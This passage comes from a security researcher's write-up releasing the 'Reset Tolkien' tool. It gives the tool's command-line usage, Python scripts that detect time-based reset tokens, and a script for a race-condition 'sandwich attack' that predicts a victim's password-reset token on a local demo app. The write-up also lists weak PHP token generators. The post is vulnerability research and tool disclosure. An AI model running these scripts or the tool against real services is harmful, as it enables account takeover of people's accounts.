  The timestamp of the reset request
  -d DATETIME, --datetime DATETIME
  The datetime of the reset request
  --datetime-format DATETIME_FORMAT
  The input datetime format (default: server date format like "Tue, 12 Mar 2024 16:24:05 UTC")
  --prefixes PREFIXES  List of possible values for the prefix concatenated with the timestamp. Format: prefix1,prefix2
  --suffixes SUFFIXES  List of possible values for the suffix concatenated with the timestamp. Format: suffix1,suffix2
  --hashes HASHES  List of possible hashes to try to detect the format. Format: suffix1,suffix2 (default: all identified hash)
  

  * `bruteforce`: provides a list of possible tokens from an arbitrarily defined token format and time frame:

  
  
  usage: reset-tolkien bruteforce [-h] [-r] [-v {0,1,2}] [-c CONFIG] [--threads THREADS] [--date-format-of-token ***REDACTED***] [--only-int-timestamp] [--decimal-length DECIMAL_LENGTH]
  [--int-timestamp-range INT_TIMESTAMP_RANGE] [--float-timestamp-range FLOAT_TIMESTAMP_RANGE] [--timezone TIMEZONE] [-t TIMESTAMP] [-d DATETIME]
  [--datetime-format DATETIME_FORMAT] [--token-format TOKEN_FORMAT] [--prefix PREFIX] [--suffix SUFFIX] [-o OUTPUT] [--with-timestamp]
  token
  
  positional arguments:
  token  The token given as input.
  
  options:
  -h, --help  show this help message and exit
  -r, --roleplay  Not recommended if you don't have anything else to do
  -v {0,1,2}, --verbosity {0,1,2}
  Verbosity level (default: 0)
  -c CONFIG, --config CONFIG
  Config file to set TimestampHashFormat (default: default.yml)
  --threads THREADS  Define the number of parallelized tasks for the decryption attack on the hash. (default: 8)
  --date-format-of-token ***REDACTED***
  Date format for the token - please set it if you have found a date as input.
  --only-int-timestamp  Only use integer timestamp. (default: False)
  --decimal-length DECIMAL_LENGTH
  Length of the float timestamp (default: 7)
  --int-timestamp-range INT_TIMESTAMP_RANGE
  Time range over which the int timestamp will be tested before and after the input value (default: 60s)
  --float-timestamp-range FLOAT_TIMESTAMP_RANGE
  Time range over which the float timestamp will be tested before and after the input value (default: 2s)
  --timezone TIMEZONE  Timezone of the application for datetime value (default: 0)
  -t TIMESTAMP, --timestamp TIMESTAMP
  The timestamp of the reset request with victim email
  -d DATETIME, --datetime DATETIME
  The datetime of the reset request with victim email
  --datetime-format DATETIME_FORMAT
  The input datetime format (default: server date format like "Tue, 12 Mar 2024 16:25:07 UTC")
  --token-format TOKEN_FORMAT
  The token encoding/hashing format - Format: encoding1,encoding2
  --prefix PREFIX  The prefix value concatenated with the timestamp.
  --suffix SUFFIX  The suffix value concatenated with the timestamp.
  -o OUTPUT, --output OUTPUT
  The filename of the output
  --with-timestamp  Write the output with timestamp
  

  * `sandwich`: provides a list of possible tokens based on a token format and a time frame bounded by two dates:

  
  
  usage: reset-tolkien sandwich [-h] [-r] [-v {0,1,2}] [-c CONFIG] [--threads THREADS] [--date-format-of-token ***REDACTED***] [--only-int-timestamp] [--decimal-length DECIMAL_LENGTH]
  [--int-timestamp-range INT_TIMESTAMP_RANGE] [--float-timestamp-range FLOAT_TIMESTAMP_RANGE] [--timezone TIMEZONE] [-bt BEGIN_TIMESTAMP] [-et END_TIMESTAMP]
  [-bd BEGIN_DATETIME] [-ed END_DATETIME] [--datetime-format DATETIME_FORMAT] [--token-format TOKEN_FORMAT] [--prefix PREFIX] [--suffix SUFFIX] [-o OUTPUT]
  [--with-timestamp]
  token
  
  positional arguments:
  token  The token given as input.
  
  options:
  -h, --help  show this help message and exit
  -r, --roleplay  Not recommended if you don't have anything else to do
  -v {0,1,2}, --verbosity {0,1,2}
  Verbosity level (default: 0)
  -c CONFIG, --config CONFIG
  Config file to set TimestampHashFormat (default: default.yml)
  --threads THREADS  Define the number of parallelized tasks for the decryption attack on the hash. (default: 8)
  --date-format-of-token ***REDACTED***
  Date format for the token - please set it if you have found a date as input.
  --only-int-timestamp  Only use integer timestamp. (default: False)
  --decimal-length DECIMAL_LENGTH
  Length of the float timestamp (default: 7)
  --int-timestamp-range INT_TIMESTAMP_RANGE
  Time range over which the int timestamp will be tested before and after the input value (default: 60s)
  --float-timestamp-range FLOAT_TIMESTAMP_RANGE
  Time range over which the float timestamp will be tested before and after the input value (default: 2s)
  --timezone TIMEZONE  Timezone of the application for datetime value (default: 0)
  -bt BEGIN_TIMESTAMP, --begin-timestamp BEGIN_TIMESTAMP
  The begin timestamp of the reset request with victim email
  -et END_TIMESTAMP, --end-timestamp END_TIMESTAMP
  The end timestamp of the reset request with victim email
  -bd BEGIN_DATETIME, --begin-datetime BEGIN_DATETIME
  The begin datetime of the reset request with victim email
  -ed END_DATETIME, --end-datetime END_DATETIME
  The end datetime of the reset request with victim email
  --datetime-format DATETIME_FORMAT
  The input datetime format (default: server date format like "Tue, 12 Mar 2024 16:25:55 UTC")
  --token-format TOKEN_FORMAT
  The token encoding/hashing format - Format: encoding1,encoding2
  --prefix PREFIX  The prefix value concatenated with the timestamp.
  --suffix SUFFIX  The suffix value concatenated with the timestamp.
  -o OUTPUT, --output OUTPUT
  The filename of the output
  --with-timestamp  Write the output with timestamp
  

## __VI.4 - Practical example

If we want to attack the application described above, we can use this tool.  
The detection scenario can also be used with a Burp tool. Here’s a Python script (specific to this application) to apply the detection scenario:
  
  
  import requests
  from bs4 import BeautifulSoup
  
  
  # Ask a reset token from a specific email
  def reset(email):
  url = f"http://localhost:5000/reset?email={email}"
  r = requests.get(url)
  return r.content, r.headers["Date"]
  
  
  # Get the token in the response
  def get_token(content):
  soup = BeautifulSoup(content, "html.parser")
  token = soup.find(id="token").attrs["href"].split("&")[1].split("=")[1]
  return token
  
  
  # Print the good command with resetTolkien to detect if the token is time-based
  def exploit(email):
  content, date = reset(email)
  token = get_token(content)
  print(
  'reset-tolkien detect %s -d "%s" --prefixes "%s" --suffixes "%s" --hashes="md5" --decimal-length 6'
  % (
  token,
  date,
  email,
  email,
  )
  )
  # >> exploit("attacker@example.com")
  # $ reset-tolkien detect 2487113242892c39716477efb579538c -d "Wed, 27 Mar 2024 15:10:18 GMT" --prefixes "attacker@example.com" --suffixes "attacker@example.com" --hashes="md5" --decimal-length 6
  # The token may be based on a timestamp: 1711552218.352686 (prefix: None / suffix: None)
  # The convertion logic is "md5,uniqid"
  

Once the hypothesis has been confirmed, we can carry out a sandwich attack with the tool. It is also possible to carry out the procedure semi-manually with a tool like Burp.

Here’s a Python script (specific to this application) that applies the attack scenario:
  
  
  import datetime
  import asyncio
  import httpx
  
  from bs4 import BeautifulSoup
  
  from resetTolkien.resetTolkien import ResetTolkien
  from resetTolkien.format import Formatter
  from resetTolkien.utils import SERVER_DATE_FORMAT
  
  
  # Get the token in the response
  def get_token(content):
  soup = BeautifulSoup(content, "html.parser")
  token = soup.find(id="token").attrs["href"].split("&")[1].split("=")[1]
  return token
  
  
  # Asynchronous function to ask a reset token from a specific email
  async def async_reset(client, email):
  url = f"http://localhost:5000/reset?email={email}"
  r = await client.get(url)
  token = get_token(r.content)
  return token, r.headers["Date"]
  
  
  # Race condition to try sandwich attack
  async def sandwich_attack_with_race_conditions(attacker_email, victim_email):
  async with httpx.AsyncClient() as client:
  tasks = []
  task = asyncio.ensure_future(async_reset(client, attacker_email))
  tasks.append(task)
  await asyncio.sleep(0.01)
  task = asyncio.ensure_future(async_reset(client, victim_email))
  tasks.append(task)
  await asyncio.sleep(0.01)
  task = asyncio.ensure_future(async_reset(client, attacker_email))
  tasks.append(task)
  
  # Get responses
  results = await asyncio.gather(*tasks, return_exceptions=True)
  return results
  
  
  # Print the good command with resetTolkien to generate possible tokens
  def exploit(attacker_email, victim_email):
  # Three requests to generate tokens via race condition
  results = asyncio.run(
  sandwich_attack_with_race_conditions(attacker_email, victim_email)
  )
  
  # Get tokens from attacker email
  (attacker_token1, request_date1) = results[0]
  (attacker_token3, request_date3) = results[2]
  
  # Victim token: here, the token is returned to us.
  # In a realistic context, the token would not be known.
  (victim_token2, _) = results[1]
  
  # Create a new object Reset Tolkien with attacker information
  # Similar to `reset-tolkien detect [attacker_token1] -d "[request_date1]" --prefixes "[attacker_email]" --suffixes "[attacker_email]" --hashes="md5" --decimal-length 6`
  tolkien = ResetTolkien(
  token=attacker_token1,
  prefixes=[attacker_email],
  suffixes=[attacker_email],
  hashes=["md5"],
  decimal_length=6,
  )
  
  # Get the request timestamp of the attacker token 1
  request_timestamp1 = (
  datetime.datetime.strptime(request_date1, SERVER_DATE_FORMAT)
  .replace(tzinfo=datetime.timezone.utc)
  .timestamp()
  )
  
  # Guess the format and the generation timestamp from the attacker token 1
  results = tolkien.detectFormat(timestamp=request_timestamp1)
  if not results:
  print("We don't know the format.")
  exit()
  
  # Get generation timestamp from token1
  generation_timestamp1 = results[0][0][0]
  
  # Get the guessed token format
  format = Formatter().export_formats(results[0][1])
  
  # Create a new object Reset Tolkien with victim information
  # Similar to `reset-tolkien detect [attacker_token3] -d "[request_date3]" --prefixes "[victim_email]" --suffixes "[victim_email]" --hashes="md5" --decimal-length 6`
  tolkien3 = ResetTolkien(
  token=attacker_token3,
  prefixes=[victim_email],
  suffixes=[victim_email],
  hashes=["md5"],
  formats=format.split(","),
  decimal_length=6,
  )
  
  # Get the request timestamp of the attacker token 3
  request_timestamp3 = (
  datetime.datetime.strptime(request_date3, SERVER_DATE_FORMAT)
  .replace(tzinfo=datetime.timezone.utc)
  .timestamp()
  )
  
  # Guess the generation timestamp from the attacker token 3
  results3 = tolkien3.detectFormat(timestamp=request_timestamp3)
  if not results:
  print("We don't know the format.")
  exit()
  
  # Get generation timestamp from the attacker token 3
  generation_timestamp3 = results3[0][0][0]
  
  # Wrong scheduling in asynchronous request
  if generation_timestamp1 >= generation_timestamp3:
  print("retry")
  exit()
  
  # Generation of potential token2
  print(f"Victim's token need to be found in output.txt : {victim_token2}")
  print(
  'reset-tolkien sandwich %s -bt %s -et %s -o output.txt --token-format="%s" --decimal-length=6'
  % (attacker_token1, generation_timestamp1, generation_timestamp3, format)
  )
  
  
  # >> exploit("attacker@example.com", "admin@example.com")
  # Victim's token need to be found : ***REDACTED-SUSPECT-TOKEN***  # $ reset-tolkien sandwich 7eac187758a468f64879111cb70a486b -bt 1711554142.503661 -et 1711554142.504054 -o output.txt --token-format="md5,uniqid" --decimal-length=6
  # Tokens have been exported in "output.txt"
  # $ grep 5411c1276ad7fab87661f82addcb11dc output.txt
  # ***REDACTED-SUSPECT-TOKEN***## __VI.5 - Default tests

By default, the tool is configured to detect this type of time-based token generation:
  
  
  function getToken($level, $email)
  {
  switch ($level) {
  case 1:
  return uniqid();
  case 2:
  return hash(time());
  case 3:
  return hash(uniqid());
  case 4:
  return hash(uniqid() . $email);
  case 5:
  return hash(date(DATE_RFC2822));
  case 6:
  return hash($email . uniqid() . $email);
  case 7:
  return uuid1("Test");
  }
  }
  

## __VI.6 - Customised test configuration

In addition, the tool allows you to define your own token formats before applying a hash function via a `TimestampHashFormat` object. For example, to test whether the token is generated using this token generation function:
  
  
  # Generate a formatted token
  def generate_token():
  import datetime
  import hashlib
  
  t = datetime.datetime.now().timestamp()
  token = hashlib.md5(uniqid(t).encode()).hexdigest()
  return token
  

This can be defined in the YAML configuration file:
  
  
  float-uniqid:
  description: "Uniqid timestamp"
  level: 2
  timestamp_type: float
  formats:
  - uniqid
  

## __VI.7 - The “Todo” list

Of course, as with any tool, there is always the possibility of adding new features to complement it.

Among the points that would be very useful:

  * **Format management via[Abstract syntax tree](https://docs.python.org/3/library/ast.html)**: the tool currently only manages formats applied in a linear way, so a simple format like `md5(timestamp()+1)` won’t be supported. By configuring formats as a tree, this type of format can be supported by the tool.
  * **Better application of user-specific information** : when detecting a token format, it is possible to define user-specific information _(defined as _i nfoiattackerinfoattackeri ∀i≥0∀i≥0_ in the algorithm_) as prefixes or suffixes of the token generation date. Many other configurations could be possible.
  * **Management of other dynamic variables** : the tool detects formats and allows attacks based on the only variable supported: time. However, some formats can have several variables that evolve (_such as the example of the second vulnerability with the`ObjectID` format whose counter is incremented with each memory access, the tool is able to detect this format but is not yet able to exploit it._).
  * **Addition of new supported formats** : the tool only supports the time-based functions found during my research, but many other formats should still exist and could also be supported by the tool.

# __VII - Conclusion

My research has led to the implementation of a **first version of a tool** that can **detect simple cases** and carry out a **sandwich attack** for a certain number of formats. It should be enriched, as research progresses, with new time-based formats.

The purpose of this article is to **open a discussion with you** to help me improve it. So don’t hesitate to come and discuss it.

This first version of the tool is stable enough in my view to be made public, but I intend to develop it further, notably using the previous list.

# __Credits

  * Main illustration: service provided by [@valentin.froute](https://www.instagram.com/valentin.froute/).

__

  * [EN] Unsecure time-based secret and Sandwich Attack - Analysis of my research and release of the “Reset Tolkien” tool
  * Abstract
  * Table of Content
  * I - First vulnerability: PHP function uniqid and password reset
  * I.1 - Context
  * I.2 - Hypothesis
  * I.3 - Attack scenario
  * I.4 - Beginning of the adventure
  * II - Second vulnerability: Mongo DB ObjectID and e-mail address confirmation
  * II.1 - Context
  * II.2 - Hypothesis
  * II.3 - Attack scenario
  * III - Research
  * III.1 - StackOverflow overview
  * III.1.1 - The bad choices, but that doesn’t help us
  * III.1.2 - The bad choices, and it’s interesting
  * III.1.3 - The good choices
  * III.2 - Limits of our previous scenarios
  * III.3 - The end of the adventure?
  * IV - Theories and algorithms
  * IV.1 - First step: known generation date
  * IV.1.1 - Detection algorithm
  * IV.1.2 - Attack algorithm
  * IV.2 - Second step: taking hash functions into account
  * IV.2.1 - Detection algorithm using hash functions
  * IV.2.2 - Attack algorithm using hash functions
  * IV.3 - Third stage: precise generation date unknown
  * IV.3.1 - Detection algorithm with arbitrary time frame
  * IV.3.2 - Attack algorithm with arbitrary time frame
  * IV.4 - Fourth step - Optimizing the attack by reducing Oracle solicitations
  * IV.4.1 - Sandwich attack scenario
  * IV.4.2 - Sandwich attack algorithm
  * IV.5 - Conclusion
  * V - Practice
  * V.2 - Scenario confirming the hypothesis
  * V.3 - Sandwich attack scenario
  * VI - Reset Tolkien
  * VI.1 - Introduction
  * VI.2 - Encoding and hash function supported
  * VI.3 - Usage
  * VI.4 - Practical example
  * VI.5 - Default tests
  * VI.6 - Customised test configuration
  * VI.7 - The “Todo” list
  * VII - Conclusion
  * Credits

Expand allBack to topGo to bottom

  * [EN] Unsecure time-based secret and Sandwich Attack - Analysis of my research and release of the “Reset Tolkien” tool
  * Abstract
  * Table of Content
  * I - First vulnerability: PHP function uniqid and password reset
  * I.1 - Context
  * I.2 - Hypothesis
  * I.3 - Attack scenario
  * I.4 - Beginning of the adventure
  * II - Second vulnerability: Mongo DB ObjectID and e-mail address confirmation
  * II.1 - Context
  * II.2 - Hypothesis
  * II.3 - Attack scenario
  * III - Research
  * III.1 - StackOverflow overview
  * III.1.1 - The bad choices, but that doesn’t help us
  * III.1.2 - The bad choices, and it’s interesting
  * III.1.3 - The good choices
  * III.2 - Limits of our previous scenarios
  * III.3 - The end of the adventure?
  * IV - Theories and algorithms
  * IV.1 - First step: known generation date
  * IV.1.1 - Detection algorithm
  * IV.1.2 - Attack algorithm
  * IV.2 - Second step: taking hash functions into account
  * IV.2.1 - Detection algorithm using hash functions
  * IV.2.2 - Attack algorithm using hash functions
  * IV.3 - Third stage: precise generation date unknown
  * IV.3.1 - Detection algorithm with arbitrary time frame
  * IV.3.2 - Attack algorithm with arbitrary time frame
  * IV.4 - Fourth step - Optimizing the attack by reducing Oracle solicitations
  * IV.4.1 - Sandwich attack scenario
  * IV.4.2 - Sandwich attack algorithm
  * IV.5 - Conclusion
  * V - Practice
  * V.2 - Scenario confirming the hypothesis
  * V.3 - Sandwich attack scenario
  * VI - Reset Tolkien
  * VI.1 - Introduction
  * VI.2 - Encoding and hash function supported
  * VI.3 - Usage
  * VI.4 - Practical example
  * VI.5 - Default tests
  * VI.6 - Customised test configuration
  * VI.7 - The “Todo” list
  * VII - Conclusion
  * Credits

Expand allBack to topGo to bottom
